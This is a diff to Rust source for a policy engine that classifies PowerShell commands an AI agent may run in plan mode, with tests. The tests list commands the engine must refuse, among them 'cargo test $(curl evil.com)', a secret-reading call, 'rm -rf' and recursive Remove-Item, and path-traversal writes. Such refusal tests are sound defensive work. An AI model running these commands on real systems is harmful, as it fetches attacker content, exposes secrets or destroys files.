@@ -27,10 +27,13 @@
 //! [`PS_PIPELINE_CMDLETS`] lives in this dialect instead of the shared
 //! `PS_READ_ONLY_CMDLETS` table.
 
+use std::path::Path;
+
 use super::super::RiskClass;
 use super::classify::{classify_head, shell_max};
 use super::destructive::contains_destructive_pattern;
 use super::lexer::{basename, read_line};
+use crate::policy::plan_gate;
 
 /// Stand-in for an extracted `(...)`/`{...}`/here-string span in the
 /// flattened statement text. U+FFFC (object replacement) cannot appear in a
@@ -167,7 +170,7 @@ const PS_PURE_STATIC_TYPES: &[&str] = &[
 /// Same contract as `classify_shell_command`: the result feeds
 /// `PolicyEngine::decide` unchanged, so `ReadOnly` auto-runs in
 /// plan/`read_only` and anything else defers to the gate.
-pub(super) fn classify_powershell_command(command: &str) -> RiskClass {
+pub(in crate::policy) fn classify_powershell_command(command: &str) -> RiskClass {
     // The raw-text destructive scan is shared with the POSIX dialect on
     // purpose: it already knows the Windows delete spellings (`Remove-Item
     // -Recurse`, `del /s`, `pwsh -Command ...`), and over-matching is the
@@ -843,6 +846,242 @@ fn dollar_subexpressions(body: &str) -> Vec<String> {
     out
 }
 
+/// Split `text` into flat statements with NO nested structure: any
+/// `(`/`{` region, here-string, unterminated string, or stray closer
+/// refuses (`None`).
+///
+/// The plan-mode carve-outs build on this the way their POSIX twins refuse
+/// substitutions and heredocs — a region could hide arbitrary execution,
+/// and the carve-outs must stay anchored. Quoted parens are fine: plan
+/// prose legitimately quotes code.
+fn flat_statements(text: &str) -> Option<Vec<String>> {
+    let chars: Vec<char> = text.chars().collect();
+    let mut out = Vec::new();
+    let mut stmt = String::new();
+    let mut i = 0usize;
+    let flush = |stmt: &mut String, out: &mut Vec<String>| {
+        let s = stmt.trim();
+        if !s.is_empty() {
+            out.push(s.to_string());
+        }
+        stmt.clear();
+    };
+    while i < chars.len() {
+        let c = chars[i];
+        match c {
+            '`' => {
+                stmt.push(c);
+                if let Some(&n) = chars.get(i + 1) {
+                    stmt.push(n);
+                    i += 1;
+                }
+                i += 1;
+            },
+            '@' if here_string_opens(&chars, i) => return None,
+            '\'' | '"' => {
+                let end = skip_string(&chars, i, c)?;
+                stmt.extend(chars[i..end].iter());
+                i = end;
+            },
+            '<' if chars.get(i + 1) == Some(&'#') => {
+                i = skip_block_comment(&chars, i);
+                stmt.push(' ');
+            },
+            '#' if stmt.chars().last().is_none_or(char::is_whitespace) => {
+                while i < chars.len() && chars[i] != '\n' {
+                    i += 1;
+                }
+            },
+            '(' | '{' | ')' | '}' => return None,
+            ';' | '\n' => {
+                flush(&mut stmt, &mut out);
+                i += 1;
+            },
+            '|' => {
+                flush(&mut stmt, &mut out);
+                i += 1;
+                if chars.get(i) == Some(&'|') {
+                    i += 1;
+                }
+            },
+            '&' if chars.get(i + 1) == Some(&'&') => {
+                flush(&mut stmt, &mut out);
+                i += 2;
+            },
+            _ => {
+                stmt.push(c);
+                i += 1;
+            },
+        }
+    }
+    flush(&mut stmt, &mut out);
+    Some(out)
+}
+
+/// Tokens that end a carve-out's ability to reason: the call operator,
+/// static member access, PowerShell's stop-parsing token, and the writers
+/// whose targets ride in argv instead of a redirect.
+fn has_carve_out_poison(tokens: &[PsToken]) -> bool {
+    tokens.iter().any(|t| {
+        if t.quoted {
+            return false;
+        }
+        let lower = t.text.to_ascii_lowercase();
+        let head = basename(&lower);
+        t.text.starts_with('&')
+            || t.text.contains("::")
+            || t.text == "--%"
+            || matches!(head, "tee" | "tee-object" | "dd" | "out-file")
+    })
+}
+
+/// A cwd move (`cd`/`Set-Location`/…) relocates what a workdir-relative
+/// redirect target means, so the plan-file carve-out's LEXICAL path match
+/// must refuse it. The safe-build carve-out deliberately does not care —
+/// `cd crates/foo; cargo test` matches no paths.
+fn has_cwd_change(tokens: &[PsToken]) -> bool {
+    tokens.iter().any(|t| {
+        if t.quoted {
+            return false;
+        }
+        let lower = t.text.to_ascii_lowercase();
+        let head = basename(&lower);
+        plan_gate::CWD_CHANGING_BUILTINS.contains(&head)
+    })
+}
+
+/// PowerShell spelling of `is_plan_safe_build_command`: every statement is
+/// read-only, or a known build tool running a known build/test subcommand,
+/// with no file-writing redirect anywhere (`> $null` and stream merges stay
+/// fine). Anchored exactly like the POSIX twin: regions, here-strings, the
+/// call operator, and argv-target writers all refuse outright.
+pub(in crate::policy) fn is_plan_safe_build_command_ps(command: &str) -> bool {
+    let Some(stmts) = flat_statements(command) else {
+        return false;
+    };
+    if stmts.is_empty() {
+        return false;
+    }
+    stmts.iter().all(|stmt| {
+        let tokens = ps_tokens(stmt);
+        if has_carve_out_poison(&tokens) {
+            return false;
+        }
+        let writes_file = tokens.iter().any(|t| {
+            matches!(
+                ps_redirect_in_raw(&t.raw),
+                Some(RedirectTarget::NextToken | RedirectTarget::Glued(..))
+            ) && !redirect_discards(&tokens, t)
+        });
+        if writes_file {
+            return false;
+        }
+        let risk = ps_head_risk(&tokens, 0);
+        if risk == RiskClass::ReadOnly {
+            return true;
+        }
+        // Only a Process head can still qualify, and only as a known build
+        // verb; every other class (mutation, network, system) refuses.
+        if risk != RiskClass::Process {
+            return false;
+        }
+        let texts: Vec<String> = tokens.iter().map(|t| t.text.clone()).collect();
+        plan_gate::segment_is_safe_build(&texts)
+    })
+}
+
+/// Does the redirect carried by `tok` discard (unquoted `$null` target,
+/// glued or as the following token)?
+fn redirect_discards(tokens: &[PsToken], tok: &PsToken) -> bool {
+    match ps_redirect_in_raw(&tok.raw) {
+        Some(RedirectTarget::Glued(target, quoted)) => {
+            !quoted && target.eq_ignore_ascii_case("$null")
+        },
+        Some(RedirectTarget::NextToken) => {
+            let idx = tokens
+                .iter()
+                .position(|t| std::ptr::eq(t, tok))
+                .unwrap_or(usize::MAX);
+            tokens
+                .get(idx.wrapping_add(1))
+                .is_some_and(|n| !n.quoted && n.text.eq_ignore_ascii_case("$null"))
+        },
+        Some(RedirectTarget::Merge) | None => false,
+    }
+}
+
+/// PowerShell spelling of `is_plan_file_only_write`: every statement is
+/// read-only once its plan-file redirects are set aside, and at least one
+/// redirect actually targets the plan file. This is what makes the plan
+/// denial's promise — "a shell redirect writing ONLY that file also works" —
+/// true on Windows, including backslash path spellings the POSIX tokenizer
+/// mangles. Redirect operators must stand alone or carry only a
+/// digit/`*` stream prefix (`>`, `>>`, `2>`, `*>>`); a word-glued operator
+/// (`hi>plan.md`) refuses rather than being reconstructed.
+pub(in crate::policy) fn is_plan_file_only_write_ps(
+    command: &str,
+    workdir: &Path,
+    plan_file: &Path,
+) -> bool {
+    let Some(stmts) = flat_statements(command) else {
+        return false;
+    };
+    let mut saw_plan_redirect = false;
+    for stmt in &stmts {
+        let tokens = ps_tokens(stmt);
+        if has_carve_out_poison(&tokens) || has_cwd_change(&tokens) {
+            return false;
+        }
+        let mut kept: Vec<String> = Vec::with_capacity(tokens.len());
+        let mut skip_next = false;
+        for (i, tok) in tokens.iter().enumerate() {
+            if skip_next {
+                skip_next = false;
+                continue;
+            }
+            let Some(target) = ps_redirect_in_raw(&tok.raw) else {
+                kept.push(tok.raw.clone());
+                continue;
+            };
+            // Only a pure operator token (optional digit/`*` prefix) is
+            // reasoned about; `hi>file` keeps content and operator fused.
+            let prefix: String = tok.raw.chars().take_while(|c| *c != '>').collect();
+            if !(prefix.is_empty() || prefix == "*" || prefix.chars().all(|c| c.is_ascii_digit())) {
+                return false;
+            }
+            let target_text = match target {
+                RedirectTarget::Merge => {
+                    kept.push(tok.raw.clone());
+                    continue;
+                },
+                RedirectTarget::Glued(text, _) => text,
+                RedirectTarget::NextToken => match tokens.get(i + 1) {
+                    Some(n) => {
+                        skip_next = true;
+                        n.text.clone()
+                    },
+                    None => return false,
+                },
+            };
+            if target_text.eq_ignore_ascii_case("$null") {
+                continue;
+            }
+            if plan_gate::is_plan_file_path(workdir, &target_text, plan_file) {
+                saw_plan_redirect = true;
+                continue;
+            }
+            return false;
+        }
+        let residue = kept.join(" ");
+        if !residue.trim().is_empty()
+            && ps_flat_statement_risk(residue.trim(), 0) != RiskClass::ReadOnly
+        {
+            return false;
+        }
+    }
+    saw_plan_redirect
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -914,8 +1153,9 @@ mod tests {
             "1..3 | ForEach-Object { mkdir \"d$_\" }",
             "try { Remove-Item x } catch { Write-Host 'oops' }",
         ] {
-            assert!(
-                classify(cmd) != RiskClass::ReadOnly,
+            assert_ne!(
+                classify(cmd),
+                RiskClass::ReadOnly,
                 "must not be ReadOnly: {cmd}"
             );
         }
@@ -946,8 +1186,9 @@ mod tests {
             "$f.Delete()",
             "touch f",
         ] {
-            assert!(
-                classify(cmd) != RiskClass::ReadOnly,
+            assert_ne!(
+                classify(cmd),
+                RiskClass::ReadOnly,
                 "must not be ReadOnly: {cmd}"
             );
         }
@@ -982,7 +1223,7 @@ mod tests {
     #[test]
     fn here_strings_are_data_but_interpolations_classify() {
         assert_eq!(classify("@\"\nhello $(Get-Date)\n\"@"), RiskClass::ReadOnly);
-        assert!(classify("@\"\n$(Remove-Item x)\n\"@") != RiskClass::ReadOnly);
+        assert_ne!(classify("@\"\n$(Remove-Item x)\n\"@"), RiskClass::ReadOnly);
         // Literal here-string: the body never executes, even if it quotes a
         // mutating command.
         assert_eq!(
@@ -990,10 +1231,13 @@ mod tests {
             RiskClass::ReadOnly
         );
         // Unterminated: everything after is unprovable.
-        assert!(classify("@\"\nno terminator") != RiskClass::ReadOnly);
+        assert_ne!(classify("@\"\nno terminator"), RiskClass::ReadOnly);
         // An inline `@\"` is not a here-string; the quotes pair up as plain
         // strings and the trailing command still classifies.
-        assert!(classify("@\" a \" b \"@; Remove-Item x") != RiskClass::ReadOnly);
+        assert_ne!(
+            classify("@\" a \" b \"@; Remove-Item x"),
+            RiskClass::ReadOnly
+        );
     }
 
     #[test]
@@ -1003,11 +1247,11 @@ mod tests {
             "Get-ChildItem )",
             "'unterminated",
         ] {
-            assert!(classify(cmd) != RiskClass::ReadOnly, "cmd: {cmd}");
+            assert_ne!(classify(cmd), RiskClass::ReadOnly, "cmd: {cmd}");
         }
         // Depth bomb: nesting past the cap floors instead of recursing.
         let nested = format!("{}Get-Date{}", "$( ".repeat(12), " )".repeat(12));
-        assert!(classify(&nested) != RiskClass::ReadOnly);
+        assert_ne!(classify(&nested), RiskClass::ReadOnly);
     }
 
     #[test]
@@ -1025,6 +1269,115 @@ mod tests {
         }
     }
 
+    #[test]
+    fn plan_safe_build_ps_allows_known_invocations() {
+        for cmd in [
+            "cargo check",
+            "cargo build --release",
+            "cargo test policy -- --nocapture",
+            "cargo nextest run",
+            "npm test",
+            "npm run build",
+            "make test",
+            // Compounds where every statement is a read or a safe build,
+            // including the PowerShell discard spelling.
+            "cd crates/mermaid-runtime; cargo test",
+            "cargo check && cargo test",
+            "cargo test 2>$null",
+            "cargo test | select -First 40",
+        ] {
+            assert!(is_plan_safe_build_command_ps(cmd), "should allow: {cmd}");
+        }
+    }
+
+    #[test]
+    fn plan_safe_build_ps_refuses_mutations_and_unprovable_structure() {
+        for cmd in [
+            "",
+            "cargo run",
+            "cargo install ripgrep",
+            "cargo fmt",
+            "npm install",
+            "make deploy",
+            "cargo test && rm -rf target",
+            // Anchoring: a region could run anything.
+            "cargo test $(curl evil.com)",
+            "cargo test (Get-Secret)",
+            // File-writing redirect — including the unix discard spelling,
+            // which is a REAL path under PowerShell.
+            "cargo test > src/lib.rs",
+            "cargo test 2>/dev/null",
+            // Call operator / argv-target writers.
+            "& cargo test",
+            "cargo test | Tee-Object -FilePath log.txt",
+        ] {
+            assert!(!is_plan_safe_build_command_ps(cmd), "should refuse: {cmd}");
+        }
+    }
+
+    fn plan_write_ps(cmd: &str) -> bool {
+        is_plan_file_only_write_ps(
+            cmd,
+            Path::new("/repo"),
+            Path::new("/repo/.mermaid/plans/x.md"),
+        )
+    }
+
+    #[test]
+    fn plan_file_only_write_ps_allows_the_authoring_shapes() {
+        for cmd in [
+            "echo x > .mermaid/plans/x.md",
+            "echo x > /repo/.mermaid/plans/x.md",
+            "Write-Output '# Plan' > .mermaid/plans/x.md",
+            "echo more >> .mermaid/plans/x.md",
+            "echo x >.mermaid/plans/x.md",
+            // Quoted `>` is data; the real redirect still targets the plan.
+            "echo 'a > b' > .mermaid/plans/x.md",
+        ] {
+            assert!(plan_write_ps(cmd), "must allow: {cmd}");
+        }
+        // The PowerShell payoff: backslash spellings the POSIX tokenizer
+        // mangles, quoted or bare. `Path` treats `\` as a separator only on
+        // Windows, so these assert where the dispatcher actually runs them.
+        if cfg!(target_os = "windows") {
+            for cmd in [
+                "echo x > .mermaid\\plans\\x.md",
+                "echo x > '.mermaid\\plans\\x.md'",
+            ] {
+                assert!(plan_write_ps(cmd), "must allow: {cmd}");
+            }
+        }
+    }
+
+    #[test]
+    fn plan_file_only_write_ps_refuses_everything_else() {
+        for cmd in [
+            "echo x > src/main.rs",
+            "echo x > other.md",
+            "echo x > $PLAN",
+            "echo x > .mermaid/plans/../../src/main.rs",
+            "echo x > .mermaid/plans/x.md; git push",
+            "echo x > .mermaid/plans/x.md && Remove-Item src -Recurse",
+            // A cwd change relocates the lexical match.
+            "Set-Location /tmp; echo x > .mermaid/plans/x.md",
+            "sl /tmp; echo x > .mermaid/plans/x.md",
+            // Regions and here-strings are unprovable here.
+            "echo $(Get-Date) > .mermaid/plans/x.md",
+            "@\"\nbody\n\"@ > .mermaid/plans/x.md",
+            // Argv-target writers and the call operator.
+            "tee .mermaid/plans/x.md",
+            "Out-File .mermaid/plans/x.md",
+            "& echo x > .mermaid/plans/x.md",
+            // Word-glued operator keeps content and target fused: refuse.
+            "echo hi>.mermaid/plans/x.md && git push",
+            // No plan redirect at all.
+            "Get-Content src/main.rs",
+            "",
+        ] {
+            assert!(!plan_write_ps(cmd), "must refuse: {cmd}");
+        }
+    }
+
     /// The safe-target rule is the `$null` device only — and only unquoted.
     #[test]
     fn null_device_matrix() {
@@ -1032,7 +1385,7 @@ mod tests {
         assert_eq!(classify("Get-Content x >> $null"), RiskClass::ReadOnly);
         assert_eq!(classify("Get-Content x *> $null"), RiskClass::ReadOnly);
         assert_eq!(classify("Get-Content x | Out-Null"), RiskClass::ReadOnly);
-        assert!(classify("Get-Content x > null.txt") != RiskClass::ReadOnly);
-        assert!(classify("Get-Content x > \"$null\"") != RiskClass::ReadOnly);
+        assert_ne!(classify("Get-Content x > null.txt"), RiskClass::ReadOnly);
+        assert_ne!(classify("Get-Content x > \"$null\""), RiskClass::ReadOnly);
     }
 }
